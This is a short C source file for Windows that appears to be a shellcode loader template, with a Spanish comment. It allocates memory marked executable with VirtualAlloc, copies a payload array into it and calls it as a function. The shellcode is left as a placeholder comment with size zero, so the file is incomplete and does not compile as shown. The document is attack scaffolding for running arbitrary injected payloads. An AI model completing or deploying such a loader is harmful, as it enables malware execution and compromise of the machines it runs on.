#include <stdio.h>
#include <windows.h>

unsigned const char payload[] =

//shellcode

size_t size = 0; //tamaño shellcode

int main(int argc, char** argv) {
	
    char* code;
	
    printf("TEXTO");
	
    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	
    memcpy(code, payload, size);
	
    ((void(*)())code)();
	
    return(0);
}
